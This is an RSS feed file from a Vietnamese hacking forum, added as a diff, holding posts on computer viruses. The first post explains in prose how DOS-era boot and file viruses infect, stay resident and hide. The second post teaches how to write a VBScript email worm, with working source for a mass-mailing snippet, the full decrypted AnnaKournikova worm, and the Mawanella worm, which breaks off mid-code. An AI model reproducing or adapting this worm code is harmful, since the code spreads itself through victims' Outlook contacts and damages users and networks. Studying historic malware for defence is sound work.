@@ -1,0 +1,938 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Virus"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/28.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Virus"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Virus</title>
+				<description><![CDATA[ 
+*Virus
+
+Virus tin học hiện nay đang là nỗi băn khoăn lo lắng của những người làm công tác tin học, là nỗi lo sợ của những người sử dụng khi máy tính của mình bị nhiễm virus. Khi máy tính của mình bị nhiễm virus, họ chỉ biết trông chờ vào các phần mềm diệt virus hiện có trên thị trường, trong trường hợp các phần mềm này không phát hiện hoặc không tiêu diệt được, họ bị lâm phải tình huống rất khó khăn, không biết phải làm như thế nào.
+Vì lý do đó, có một cách nhìn nhận cơ bản về cơ chế và các nguyên tắc hoạt động của virus tin học là cần thiết. Trên cơ sở đó, có một cách nhìn đúng đắn về virus tin học trong việc phòng chống, kiểm tra, chữa trị cũng như cách phân tích, nghiên cứu một virus mới xuất hiện.
+
+I. Virus tin học.
+
+Thuật ngữ virus tin học dùng để chỉ một chương trình máy tính có thể tự sao chép chính nó lên nơi khác (đĩa hoặc file) mà người sử dụng không hay biết. Ngoài ra, một đặc điểm chung thường thấy trên các virus tin học là tính phá hoại, nó gây ra lỗi thi hành, thay đổi vị trí, mã hoá hoặc huỷ thông tin trên đĩa.
+
+II. Phân loại:
+
+Thông thường, dựa vào đối tượng lây lan là file hay đĩa mà virus được chia thành hai nhóm chính:
+
+- B-virus: Virus chỉ tấn công lên Master Boot hay Boot Sector.
+
+- F-virus: Virus chỉ tấn công lên các file khả thi.
+
+Mặc dù vậy, cách phân chia này cũng không hẳn là chính xác. Ngoại lệ vẫn có các virus vừa tấn công lên Master Boot (Boot Sector) vừa tấn công lên file khả thi.
+
+Ðể có một cách nhìn tổng quan về virus, chúng ta xem chúng dành quyền điều khiển như thế nào.
+
+a. B-virus.
+
+Khi máy tính bắt đầu khởi động (Power on), các thanh ghi phân đoạn đều được đặt về 0FFFFh, còn mọi thanh ghi khác đều được đặt về 0. Như vậy, quyền điều khiển ban đầu được trao cho đoạn mã tại 0FFFFh: 0h, đoạn mã này thực ra chỉ là lệnh nhảy JMP FAR đến một đoạn chương trình trong ROM, đoạn chương trình này thực hiện quá trình POST (Power On Self Test - Tự kiểm tra khi khởi động).
+
+Quá trình POST sẽ lần lượt kiểm tra các thanh ghi, kiểm tra bộ nhớ, khởi tạo các Chip điều khiển DMA, bộ điều khiển ngắt, bộ điều khiển đĩa... Sau đó nó sẽ dò tìm các Card thiết bị gắn thêm để trao quyền điều khiển cho chúng tự khởi tạo rồi lấy lại quyền điều khiển. Chú ý rông đây là đoạn chương trình trong ROM (Read Only Memory) nên không thể sửa đổi, cũng như không thể chèn thêm một đoạn mã nào khác.
+
+Sau quá trình POST, đoạn chương trình trong ROM tiến hành đọc Boot Sector trên đĩa A hoặc Master Boot trên đĩa cứng vào RAM (Random Acess Memory) tại địa chỉ 0:7C00h và trao quyền điều khiển cho đoạn mã đó bông lệnh JMP FAR 0:7C00h. Ðây là chỗ mà B-virus lợi dụng để tấn công vào Boot Sector (Master Boot), nghĩa là nó sẽ thay Boot Sector (Master Boot) chuẩn bông đoạn mã virus, vì thế quyền điều khiển được trao cho virus, nó sẽ tiến hành các hoạt động của mình trước, rồi sau đó mới tiến hành các thao tác như thông thường: Ðọc Boot Sector (Master Boot) chuẩn mà nó cất giấu ở đâu đó vào 0:7C00h rồi trao quyền điều khiển cho đoạn mã chuẩn này, và người sử dụng có cảm giác rông máy tính của mình vẫn hoạt động bình thường.
+
+b. F-virus.
+
+Khi DOS tổ chức thi hành File khả thi (bông chức năng 4Bh của ngắt 21h), nó sẽ tổ chức lại vùng nhớ, tải File cần thi hành và trao quyền điều khiển cho File đó. F-virus lợi dụng điểm này bông cách gắn đoạn mã của mình vào file đúng tại vị trí mà DOS trao quyền điều khiển cho File sau khi đã tải vào vùng nhớ. Sau khi F-virus tiến hành xong các hoạt động của mình, nó mới sắp xếp, bố trí trả lại quyền điều khiển cho File để cho File lại tiến hành hoạt động bình thường, và người sử dụng thì không thể biết được.
+
+Trong các loại B-virus và F-virus, có một số loại sau khi dành được quyền điều khiển, sẽ tiến hành cài đặt một đoạn mã của mình trong vùng nhớ RAM như một chương trình thường trú (TSR), hoặc trong vùng nhớ nôm ngoài tầm kiểm soát của DOS, nhôm mục đích kiểm soát các ngắt quan trọng như ngắt 21h, ngắt 13h,... Mỗi khi các ngắt này được gọi, virus sẽ dành quyền điều khiển để tiến hành các hoạt động của mình trước khi trả lại các ngắt chuẩn của DOS.
+
+III. Các đặc điểm của B-VIRUS.
+
+Qua chương trước, chúng ta đã đưa ra các thông tin hết sức cơ bản về cấu trúc đĩa, tiến trình khởi động và cách thức tổ chức vùng nhớ, tổ chức thi hành file của DOS. Những thông tin đó giúp chúng ta tìm hiểu những đặc điểm cơ bản của virus, từ đó đưa ra cách phòng chống, chữa trị trong trường hợp máy bị nhiễm virus.
+
+1. Phân loại B-virus.
+
+Như chúng ta đã biết, sau quá trình POST, sector đầu tiên trên đĩa A hoặc đĩa C được đọc vào vùng nhớ tại 0: 7C00, và quyền điều khiển được trao cho đoạn mã trong sector khởi động này. B-virus hoạt động bông cách thay thế đoạn mã chuẩn trong sector khởi động này bông đoạn mã của nó để chiếm quyền điều khiển, sau khi đã cài đặt xong mới đọc sector khởi động chuẩn được virus cất giữ ở đâu đó vào 0:7C00 và trả lại quyền điều khiển cho đoạn mã chuẩn này. Việc cất giữ sector khởi động tại vị trí nào trên đĩa tuỳ thuộc loại đĩa và cách giải quyết của từng loại virus. Ðối với đĩa cứng, thông thường nó được cất giữ ở đâu đó trong Side 0, Cylinder 0 vì trong cả track này, DOS chỉ sử dụng sector đầu tiên cho bảng Partition. Trên đĩa mềm, vị trí cất giữ sẽ phức tạp hơn vì mọi chỗ đều có khả năng bị ghi đè thông tin. Một số hướng sau đây đã được các virus áp dụng:
+
+Sử dụng sector ở cuối Root Directory, vì nó thường ít được sử dụng.
+
+Sử dụng các sector cuối cùng trên đĩa, vì khi phân bổ vùng trống cho file, DOS tìm vùng trống từ nhỏ đến lớn cho nên vùng này thường ít được sử dụng.
+
+Ghi vào vùng trống trên đĩa, đánh dấu trong bảng FAT vùng này là vùng bị hỏng để DOS không sử dụng cấp phát nữa. Ccáh làm này an toàn hơn các cách làm trên đây.
+
+Format thêm track và ghi vào track vừa được Format thêm.
+
+Tùy thuộc vào độ lớn của đoạn mã virus mà B-virus được chia thành hai loại:
+
+a. SB-virus.
+
+Chương trình của SB-virus chỉ chiếm đúng một sector khởi động, các tác vụ của SB-virus không nhiều và tương đối đơn giản. Hiện nay số các virus loại này thường ít gặp và có lẽ chỉ là các virus do trong nước "sản xuất".
+
+b. DB-virus.
+
+Ðây là những loại virus mà đoạn mã của nó lớn hơn 512 byte (thường thấy).
+
+Vì thế mà chương trình virus được chia thành hai phần:
+
+- Phần đầu virus: Ðược cài đặt trong sector khởi động để chiếm quyền điều hiển khi quyền điều khiển được trao cho sector khởi động này. Nhiệm vụ duy nhất của phần đầu là: tải tiếp phần thân của virus vào vùng nhớ và trao quyền điều khiển cho phần thân đó. Vì nhiệm vụ đơn giản như vậy nên phần đầu của virus thường rất ngắn, và càng ngắn càng tốt vì càng ngắn thì sự khác biệt giữa sector khởi động chuẩn và sector khởi động đã bị nhiễm virus càng ít, giảm khả năng bị nghi ngờ.
+
+- Phần thân virus: Là phần chương trình chính của virus. Sau khi được phần đầu tải vào vùng nhớ và trao quyền, phần thân này sẽ tiến hành các tác vụ của mình, sau khi tiến hành xong mới đọc sector khởi động chuẩn vào vùng nhớ và trao quyền cho nó để máy tính làm việc một cách bình thường như chưa có gì xảy ra cả.
+
+2. Một số kỹ thuật cơ bản của B-virus.
+
+Dù là SB-virus hay DB-virus, nhưng để tồn tại và lây lan, chúng đều có một số các kỹ thuật cơ bản như sau:
+
+a. Kỹ thuật kiểm tra tính duy nhất.
+
+Virus phải tồn tại trong bộ nhớ cũng như trên đĩa, song sự tồn tại quá nhiều bản sao của chính nó trên đĩa và trong bộ nhớ sẽ chỉ làm chậm quá trình Boot máy, cũng như chiếm quá nhiều vùng nhớ ảnh hưởng tới việc tải và thi hành các chương trình khác đồng thời cũng làm giảm tốc độ truy xuất đĩa. Chính vì thế, kỹ thuật này là một yêu cầu nghiêm ngặt với B-virus.
+
+Việc kiểm tra trên đĩa có hai yếu tố ảnh hưởng:
+
+Thứ nhất là thời gian kiểm tra:
+
+Nếu mọi tác vụ đọc/ghi đĩa đều phải kiểm tra đĩa thì thời gian truy xuất sẽ bị tăng gấp đôi, làm giảm tốc độ truy xuất cũng như gia tăng mỗi nghi ngờ.
+
+Ðối với yêu cầu này, các virus áp dụng một số kỹ thuật sau: Giảm số lần kiểm tra bông cách chỉ kiểm tra trong trường hợp thay đổi truy xuất từ ổ đĩa này sang ổ đĩa khác, chỉ kiểm tra trong trường hợp bảng FAT trên đĩa được đọc vào.
+
+Thứ hai là kỹ thuật kiểm tra:
+
+Hầu hết các virus đều kiểm tra bông giá trị từ khoá. Mỗi virus sẽ tạo cho mình một giá trị đặc biệt tại một vị trí xác định trên đĩa, việc kiểm tra được tiến hành bông cách đọc Boot record và kiểm tra giá trị của từ khoá này. Kỹ thuật này gặp trở ngại vì số lượng B-virus ngày một đông đảo, mà vị trí trên Boot Record thì có hạn. Cách khắc phục hiện nay của các virus là tăng số lượng mã lệnh cần so sánh để làm giảm khả năng trùng hợp ngẫu nhiên.
+
+Ðể kiểm tra sự tồn tại của mình trong bộ nhớ, các virus đã áp dụng các kỹ thuật sau: Ðơn giản nhất là kiểm tra giá trị Key value tại một vị trí xác định trên vùng nhớ cao, ngoài ra một kỹ thuật khác được áp dụng đối với các virus chiếm ngắt Int 21 của DOS là yêu cầu thực hiện một chức năng đặc biệt không có trong ngắt này. Nếu cờ báo lỗi được bật lên thì trong bộ nhớ chưa có virus, ngược lại nếu virus đã lưu trú trong vùng nhớ thì giá trị trả lại (trong thanh ghi AX chẳng hạn) là một giá trị xác định nào đó.
+
+b. Kỹ thuật lưu trú.
+
+Sau khi thực hiện xong chương trình POST, giá trị tổng số vùng nhớ vừa được Test sẽ được lưu vào vùng BIOS Data ở địa chỉ 0:413h. Khi hệ điều hành nhận quyền điều khiển, nó sẽ coi vùng nhớ mà nó kiểm soát là giá trị trong địa chỉ này. Vì vậy để lưu trú, mọi B-virus đều áp dụng kỹ thuật sau đây: Sau khi tải phần lưu trú của mình lên vùng nhớ cao, nó sẽ giảm giá trị vùng nhớ do DOS quản lý tại 0:413h đi một lượng đúng bông kích thước của virus. Tuy nhiên nếu không kiểm tra tốt sự có mặt trong vùng nhớ, khi bị Boot mềm liên tục, giá trị tổng số vùng nhớ này sẽ bị giảm nhiều lần, ảnh hưởng tới việc thực hiện của các chương trình sau này. Chính vì thế, các virus được thiết kế tốt phải kiểm tra sự tồn tại của mình trong bộ nhớ, nếu đã có mặt trong bộ nhớ thì không giảm dung lượng vùng nhớ nữa.
+
+c. Kỹ thuật lây lan.
+
+Ðoạn mã thực hiện nhiệm vụ lây lan là đoạn mã quan trọng trong chương trình virus. Ðể đảm bảo việc lây lan, virus khống chế ngắt quan trọng nhất trong việc đọc/ghi vùng hệ thống: đó là ngắt 13h, tuy nhiên để đảm bảo tốc độ truy xuất đĩa, chỉ các chức năng 2 và 3 (đọc/ghi) là dẫn tới việc lây lan. Việc lây lan bông cách đọc Boot Sector (Master Boot) lên và kiểm tra xem đã bị lây chưa (kỹ thuật kiểm tra đã nói ở trên). Nếu sector khởi động đó chưa bị nhiễm thì virus sẽ tạo một sector khởi động mới với các tham số tương ứng của đoạn mã virus rồi ghi trở lại vào vị trí của nó trên đĩa. Còn sector khởi động vừa đọc lên cùng với thân của virus (loại DB-virus) sẽ được ghi vào vùng xác định trên đĩa. Ngoài ra một số virus còn chiếm ngắt 21 của DOS để lây nhiễm và phá hoại trên các file mà ngắt 21 làm việc.
+
+Việc xây dựng sector khởi động có đoạn mã của virus phải đảm bảo các kỹ thuật sau đây:
+
+- Sector khởi động bị nhiễm phải còn chứa các tham số đĩa phục vụ cho quá trình truy xuất đĩa, đó là bảng tham số BPB của Boot record hay bảng phân chương trong trường hợp Master boot. Việc không bảo toàn sẽ dẫn đến việc virus mất quyền điều khiển hoặc không thể kiểm soát được đĩa nếu virus không có mặt trong môi trường.
+
+- Sự an toàn của sector khởi động nguyên thể và đoạn thân của virus cũng phải được đặt lên hàng đầu. Các kỹ thuật về vị trí cất giấu chúng ta cũng đã phân tích ở các phần trên.
+
+d. Kỹ thuật ngụy trang và gây nhiễu.
+
+Kỹ thuật này ra đời khá muộn về sau này, do khuynh hướng chống lại sự phát hiện của người sử dụng và những lập trình viên đối với virus. Vì kích thước của virus khá nhỏ bé cho nên các lập trình viên hoàn toàn có thể dò từng bước xem cơ chế của virus hoạt động như thế nào, cho nên các virus tìm mọi cách lắt léo để chống lại sự theo dõi của các lập trình viên.
+
+Các virus thường áp dụng một số kỹ thuật sau đây:
+
+- Cố tình viết các lệnh một cách rắc rối như đặt Stack vào các vùng nhớ nguy hiểm, chiếm và xoá các ngắt, thay đổi một cách lắt léo các thanh ghi phân đoạn để người dò không biết dữ liệu lấy từ đâu, thay đổi các giá trị của các lệnh phía sau để người sử dụng khó theo dõi.
+
+- Mã hoá ngay chính chương trình của mình để người sử dụng không phát hiện ra quy luật, cũng như không thấy một cách rõ ràng ngay sự hoạt động của virus.
+
+- Ngụy trang: Cách thứ nhất là đoạn mã cài vào sector khởi động càng ngắn càng tốt và càng giống sector khởi động càng tốt. Tuy vậy cách thứ hai vẫn được nhiều virus áp dụng: Khi máy đang nôm trong quyền chi phối của virus, mọi yêu cầu đọc/ghi Boot sector (Master boot) đều được virus trả về một bản chuẩn: bản trước khi bị virus lây. Ðiều này đánh lừa người sử dụng và các chương trình chống virus không được thiết kế tốt nếu máy hiện đang chịu sự chi phối của virus.
+
+e. Kỹ thuật phá hoại.
+
+Ðã là virus thì bao giờ cũng có tính phá hoại. Có thể phá hoại ở mức đùa cho vui, cũng có thể là phá hoại ở mức độ nghiêm trọng, gây mất mát và đình trệ đối với thông tin trên đĩa.
+
+Căn cứ vào thời điểm phá hoại, có thể chia ra thành hai loại:
+
+- Loại định thời: Loại này lưu giữ một giá trị, giá trị này có thể là ngày giờ, số lần lây nhiễm, số giờ máy đã chạy, ... Nếu giá trị này vượt quá một con số cho phép, nó sẽ tiến hành phá hoại. Loại này thường nguy hiểm vì chúng chỉ phá hoại một lần.
+
+- Loại liên tục: Sau khi bị lây nhiễm và liên tục, virus tiến hành phá hoại, song do tính liên tục này, các hoạt động phá hoại của nó không mang tính nghiêm trọng, chủ yếu là đùa cho vui.
+
+IV. Các đặc điểm của F-VIRUS
+
+So với B-virus thì số lượng F-virus đông đảo hơn nhiều, có lẽ do các tác vụ đĩa với sự hỗ trợ của Int 21 đã trở nên cực kỳ dễ dàng và thoải mái, đó là điều kiện phát triển cho các F-virus.
+
+Thường thì các F-virus chỉ lây lan trên các file khả thi (có đuôi .COM hoặc .EXE), tuy nhiên một nguyên tắc mà virus phải tuân thủ là: Khi thi hành một file khả thi bị lây nhiễm, quyền điều khiển phải nôm trong tay virus trước khi virus trả nó lại cho file bị nhiễm, và khi file nhận lại quyền điều khiển, tất cả mọi dữ liệu của file phải được bảo toàn.
+
+Ðối với F-virus, có một số kỹ thuật được nêu ra ở đây:
+
+1. Kỹ thuật lây lan:
+
+Các F-virus chủ yếu sử dụng hai kỹ thuật: Thêm vào đầu và thêm vào cuối
+
+a. Thêm vào đầu file.
+Thông thường, phương pháp này chỉ áp dụng cho các file .COM, tức là đầu vào của chương trình luôn luôn tại PSP:100h. Lợi dụng đầu vào cố định, virus chèn đoạn mã của chương trình virus vào đầu chương trình đối tượng, đẩy toàn bộ chương trình đối tượng xuống phía dưới. Cách này có một nhược điểm là do đầu vào cố định của chương trình .COM là PSP:100, cho nên trước khi trả lại quyền điều khiển cho chương trình, phải đẩy lại toàn bộ chương trình lên bắt đầu từ offset 100h. Cách lây này gây khó khăn cho những người khôi phục vì phải đọc toàn bộ file vào vùng nhớ rồi mới tiến hành ghi lại.
+
+b. Thêm vào cuối file.
+
+Khác với cách lây lan ở trên, trong phương pháp này, đoạn mã của virus sẽ được gắn vào sau của chương trình đối tượng. Phương pháp này được thấy trên hầu hết các loại virus vì phạm vi lây lan của nó rộng rãi hơn phương pháp trên.
+
+Do thân của virus không nôm đúng đầu vào của chương trình, cho nên để chiếm quyền điều khiển, phải thực hiện kỹ thuật sau đây:
+
+- Ðối với file .COM: Thay các byte đầu tiên của chương trình (đầu vào) bông một lệnh nhảy JMP, chuyển điều khiển đến đoạn mã của virus.
+
+E9 xx xx JMP Entry virus.
+
+- Ðối với file .EXE: Chỉ cần định vị lại hệ thống các thanh ghi SS, SP, CS, IP trong Exe Header để trao quyền điều khiển cho phần mã virus.
+
+Ngoài hai kỹ thuật lây lan chủ yếu trên, có một số ít các virus sử dụng một số các kỹ thuật đặc biệt khác như mã hoá phần mã của chương trình virus trước khi ghép chúng vào file để ngụy trang, hoặc thậm chí thay thế một số đoạn mã ngắn trong file đối tượng bông các đoạn mã của virus, gây khó khăn cho quá trình khôi phục.
+
+Khi tiến hành lây lan trên file, đối với các file được đặt các thuộc tính Sys (hệ thống), Read Only (chỉ đọc), Hidden (ẩn), phải tiến hành đổi lại các thuộc tính đó để có thể truy nhập, ngoài ra việc truy nhập cũng thay đổi lại ngày giờ cập nhật của file, vì thế hầu hết các virus đều lưu lại thuộc tính, ngày giờ cập nhật của file để sau khi lây nhiễm sẽ trả lại y nguyên thuộc tính và ngày giờ cập nhật ban đầu của nó.
+
+Ngoài ra, việc cố gắng ghi lên đĩa mềm có dán nhãn bảo vệ cũng tạo ra dòng thông báo lỗi của DOS: Retry - Aboart - Ignoreô, nếu không xử lý tốt thì dễ bị người sử dụng phát hiện ra sự có mặt của virus. Lỗi kiểu này được DOS kiểm soát bông ngắt 24h, cho nên các virus muốn tránh các thông báo kiểu này của DOS khi tiến hành lây lan phải thay ngắt 24h của DOS trước khi tiến hành lây lan rồi sau đó hoàn trả.
+
+2. Kỹ thuật đảm bảo tính tồn tại duy nhất.
+
+Cũng giống như B-virus, một yêu cầu nghiêm ngặt đặt ra đối với F-virus là tính tồn tại duy nhất của mình trong bộ nhớ cũng như trên file.
+
+Trong vùng nhớ, thông thường các F-virus sử dụng hai kỹ thuật chính: Thứ nhất là tạo thêm chức năng cho DOS, bông cách sử dụng một chức năng con nào đó trong đó đặt chức năng lớn hơn chức năng cao nhất mà DOS có. Ðể kiểm tra chỉ cần gọi chức năng này, giá trị trả lại trong thanh ghi quyết định sự tồn tại của virus trong bộ nhớ hay chưa. Cách thứ hai là so sánh một đoạn mã trong vùng nhớ ấn định với đoạn mã của virus, nếu có sự chênh lệch thì có nghĩa là virus chưa có mặt trong vùng nhớ và sẽ tiến hành lây lan.
+
+Trên file, có thể có các cách kiểm tra như kiểm tra bông test logic nào đó với các thông tin của Entry trong thư mục của file này. Cách này không đảm bảo tính chính xác tuyệt đối song nếu thiết kế tốt thì khả năng trùng lặp cũng hạn chế, hầu như không có, ngoài ra một ưu điểm là tốc độ thực hiện kiểm tra rất nhanh. Ngoài ra có thể kiểm tra bông cách dò một đoạn mã đặc trưng (key value) của virus tại vị trí ấn định nào đó trên file, ví dụ trên các byte cuối cùng của file.
+
+3. Kỹ thuật thường trú
+
+Ðây là một kỹ thuật khó khăn, lý do là DOS chỉ cung cấp chức năng thường trú cho chương trình, nghĩa là chỉ cho phép cả chương trình thường trú. Vì vậy nếu sử dụng chức năng của DOS, chương trình virus muốn thường trú thì cả file đối tượng cũng phải thường trú, mà điều này thì không thể được nếu kích thước của file đối tượng quá lớn.
+
+Chính vì lý do trên, hầu hết các chương trình virus muốn thường trú đều phải thao tác qua mặt DOS trên chuỗi MCB bông phương pháp "thủ công". Căn cứ vào việc thường trú được thực hiện trước hay sau khi chương trình đối tượng thi hành, có thể chia kỹ thuật thường trú thành hai nhóm:
+
+a. Thường trú trước khi trả quyền điều khiển.
+
+Như đã nói ở trên, DOS không cung cấp một chức năng nào cho kiểu thường trú này, cho nên chương trình virus phải tự thu xếp. Các cách sau đây đã được virus dùng đến:
+
+- Thao tác trên MCB để tách một khối vùng nhớ ra khỏi quyền điều khiển của DOS, rồi dùng vùng này để chứa chương trình virus.
+
+- Tự định vị vị trí trong bộ nhớ để tải phần thường trú của virus vào, thường thì các virus chọn ở vùng nhớ cao, phía dưới phần tạm trú của file command.com để tránh bị ghi đè khi hệ thống tải lại command.com. Vì không cấp phát bọ nhớ cho phần chương trình virus đang thường trú, cho nên command.com hoàn toàn có quyền cấp phát vùng nhớ đó cho các chương trình khác, nghĩa là chương trình thương trú của virus phải chấp nhận sự mất mát do may rủi.
+
+- Thường trú bông chức năng thường trú 31h: Ðây là một kỹ thuật phức tạp, tiến trình cần thực hiện được mô tả như sau:
+
+Khi chương trình virus được trao quyền, nó sẽ tạo ra một MCB được khai báo là phần tử trung gian trong chuỗi MCB để chứa chương trình virus, sau đó lại tạo tiếp một MCB mới để cho chương trình bị nhiễm bông cách dời chương trình xuống vùng mới này. Ðể thay đổi PSP mà DOS đang lưu giữ thành PSP mà chương trình virus tạo ra cho chương trình đối tượng, phải sử dụng chức năng 50h của ngắt 21h.
+
+b. Thường trú sau khi đoạt lại quyền điều khiển.
+
+Chương trình virus lấy tên chương trình đang thi hành trong môi trường của DOS, rồi nó thi hành ngay chính bản thân mình. Sau khi thi hành xong, quyền điều khiển lại được trả về cho virus, và khi đó nó mới tiến hành thường trú một cách bình thường bông chức năng 31h của ngắt 21h.
+
+4. Kỹ thuật ngụy trang và gây nhiễu
+
+Một nhược điểm không tránh khỏi là file đối tượng bị lây nhiễm virus sẽ bị tăng kích thước. Một số virus ngụy trang bông cách khi sử dụng chức năng DIR của DOS, virus chi phối chức năng tìm kiếm file (chức năng 11h và 12h của ngắt 21h) để giảm kích thước của file bị lây nhiễm xuống, vì thế khi virus đang chi phối máy tính, nếu sử dụng lệnh DIR của DOS, hoặc các lệnh sử dụng chức năng tìm kiếm file ở trên để có thông tin về entry trong bảng thư mục, thì thấy kích thước file bị lây nhiễm vẫn bông kích thước của file ban đầu, điều này đánh lừa người sử dụng về sự trong sạch của file này.
+
+Một số virus còn gây nhiễu bông cách mã hoá phần lớn chương trình virus, chỉ khi nào vào vùng nhớ, chương trình mới được giải mã ngược lại. Một số virus anti-debug bông cách chiếm ngắt 1 và ngắt 3. Bởi vì các chương trình debug thực chất phải dùng ngắt 1 và ngắt 3 để thi hành từng bước một, cho nên khi virus chiếm các ngắt này rồi mà người lập trình dùng debug để theo dõi virus thì kết quả không lường trước được.
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/396.hva#945</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/396.hva#945</link>
+				<pubDate><![CDATA[Mon, 26 Jun 2006 00:07:01]]> GMT</pubDate>
+				<author><![CDATA[ BigballVN]]></author>
+			</item>
+			<item>
+				<title>Virus</title>
+				<description><![CDATA[ ah ! hy vongj cho nayf cho minhf post bai suu tam ve virus de minh dong gop kien thuc vao nhe ! hi
+. bai nay suu tam dau do o viet hacker hay HVA cac ban thi phai ! hi 
+
+
+Trước tiên tôi nói về cách làm thế nào để viết một Email-Worn bằng VisualbasicScript:Việc sử dụng VBS để viết virus có thể nói là khá phổ biến, điển hình như virus loveletter,Anakournikova,mawanella .. 
+
+Ở đây tôi chỉ phân tích chi tiết về mã nguồn có chức năng là làm lây lan virus , còn tác dụng (đối với người code virus) và tác hại đối với vixtim như thế nào là tùy vào mỗi virus)
+
+-------------------source code-------------
+
+On Error Resume Next
+Dim x
+Set so=CreateObject("Scripting.FileSystemObject")
+so.GetFile(WScript.ScriptFullName).Copy("C:\virusn ame.vbs")
+Set ol=CreateObject("Outlook.Application")
+For x=1 To 50
+Set Mail=ol.CreateItem(0)
+Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).Ad dressEntries(x)
+Mail.Subject="Tiêu đề của thư"
+Mail.Body="nội dung thư"
+Mail.Attachments.Add("C:\virusname.vbs")
+Mail.Send
+Next
+ol.Quit
+
+-----------------------------------
+
+Với những người đã quen với lập trình VB thì không khó để hiểu đoạn mã này.
+
+Đầu tiên nó sẽ tìm trong AddressBook của victim ,ở đây biến x chạy từ 1 đến 50 tương ứng với việc 
+
+Nó sẽ tìm 50 địa chỉ trong Address list, và gửi mail đến các địa chỉ đó với tiêu đề và nội dung cho trước
+
+Và nó sẽ đính kèm chính nó vào bức thư đó, như vậy khi victim click vào nó sẽ hoạt động, cứ như vạy mà lây lan.
+
+Để tìm hiểu thêm các bạn có thể xem mã nguồn của virus AnnaKournikova dưới đây, bạn có thể thấy ở hàm OutLook của virus AnnaKournikova cũng sử dụng cách thức gần giống với đoạn mã phía trên.Đối với virus *.vbs thì chỉ cần code mã nguồn bằng notepad rồi save as *.vbs là xong. Và cách thức vô hiệu hóa virus dạng này (chỉ là tạm thời trước khi có trình diệt virus cần thiết) là bỏ window ScriptingHost (theo bài viết bên PcleHoan).Trong phần tùy chọn các mục cài đặt của windows. Tôi nói đây chỉ là tạm thời bời vì mặc dù có thể nói bằng cách này virus không còn môi trường để hoạt động nhưng một số ứng dụng khác cũng không hoạt động ví dụ như bạn sẽ gặp trục trặc trong việc hiển thị Desktop,explorer theo kiểu As Web Page.. Vậ nên cách tốt nhất vẫn là cập nhật chương trình diệt virus thường xuyên.
+
+//*****Decrypted Code******
+'Vbs.OnTheFly Created By OnTheFly //L@/\/\3R who released the worm
+On Error Resume Next
+Set ws = CreateObject("WScript.Shell")
+
+//says "Worm made with VBSwg 1.50b": another pitfall
+ws.regwrite "HKCU\software\OnTheFly\", Chr(87) & Chr(111) & Chr(114) & 
+Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & 
+Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & 
+Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & 
+Chr(48) & Chr(98)
+
+Set fso= Createobject("scripting.filesystemobject")
+
+fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(0)& 
+"\AnnaKournikova.jpg.vbs"
+
+if ws.regread ("HKCU\software\OnTheFly\mailed") <> "1" then
+Outlook()
+end if
+
+//Red Herring? Maybe, but NL *might* be the origin of the worm
+if month(now) =1 and day(now) = 26 then
+ws.run "Http://www.dynabyte.nl",3,false
+end if
+
+//The following section could be an anti-deletion technique
+Set AnnaKournikova = fso.opentextfile(wscript.scriptfullname, 1)
+SourceCode = AnnaKournikova.readall
+AnnaKournikova.Close
+Do
+If Not (fso.fileexists(wscript.scriptfullname)) Then
+Set AnnaKournikova = fso.createtextfile(wscript.scriptfullname, True)
+AnnaKournikova.write SourceCode
+AnnaKournikova.Close
+End If
+Loop
+
+Function Outlook()
+On Error Resume Next
+Set OutlookApp = CreateObject("Outlook.Application")
+If OutlookApp= "Outlook"Then
+Set Mapi=OutlookApp.GetNameSpace("MAPI")
+Set MapiAdList= Mapi.AddressLists
+For Each Address In MapiAdList
+If Address.AddressEntries.Count <> 0 Then
+NumOfContacts = Address.AddressEntries.Count
+//Get a list of contacts
+For ContactNumber = 1 To NumOfContacts
+Set EmailItem = OutlookApp.CreateItem(0)
+Set ContactNumber = Address.AddressEntries(ContactNumber)
+EmailItem.To = ContactNumber.Address
+EmailItem.Subject = "Here you have, ;o)"
+EmailItem.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
+set EmailAttachment=EmailItem.Attachments
+EmailAttachment.Add fso.GetSpecialFolder(0)& "\AnnaKournikova.jpg.vbs"
+EmailItem.DeleteAfterSubmit = True
+
+//Send the thing
+If EmailItem.To <> "" Then
+EmailItem.Send
+ws.regwrite "HKCU\software\OnTheFly\mailed", "1"
+End If
+Next
+End If
+Next
+end if
+End Function
+'Vbswg 1.50b
+
+
+Ở mã nguồn của virus AnnaKournikova bạn có thể thấy một số chỗ sử dụng Chr(x) đó là cách thay vì viết bằng các ký tự ASCII nó sử dụng hàm Chr để tránh việc bị các trình diệt virus phát hiện.Trong hacking thì chắc các bạn thấy một số trường hợp có sử dụng Chr(x) để thay cho các dấu /,%,\. (tất nhiên là không phải để tránh các trình diệt virus) Còn đây là mã nguồn của mawanella:
+
+--------------------------------------source code----------------
+
+' Mawanella Worm
+
+' Decrypted by MrBrownstone
+
+'
+
+On Error ResumeNext
+
+Rem // I hate Mawanella incident
+
+Set W_S = CreateObject("WScript.Shell")
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+set file = fso.OpenTextFile(WScript.ScriptFullname,1)
+
+vbscopy=file.ReadAll
+
+main()
+
+sub main()
+
+On Error Resume Next
+
+dim wscr,rr, strMsg
+
+set wscr=CreateObject("WScript.Shell")
+
+Set dirwin = fso.GetSpecialFolder(0)
+
+Set dirsystem = fso.GetSpecialFolder(1)
+
+Set dirtemp = fso.GetSpecialFolder(2)
+
+Set cFile = fso.GetFile(WScript.ScriptFullName)
+
+cFile.Copy(dirsystem&"\Mawanella.vbs")
+
+
+Set OutlookA = CreateObject("Outlook.Application")
+
+If OutlookA = "Outlook" Then
+
+Set Mapi=OutlookA.GetNameSpace("MAPI")
+
+Set AddLists=Mapi.AddressLists
+
+For Each ListIndex In AddLists
+
+If ListIndex.AddressEntries.Count <> 0 Then
+
+ContactCountX = ListIndex.AddressEntries.Count
+
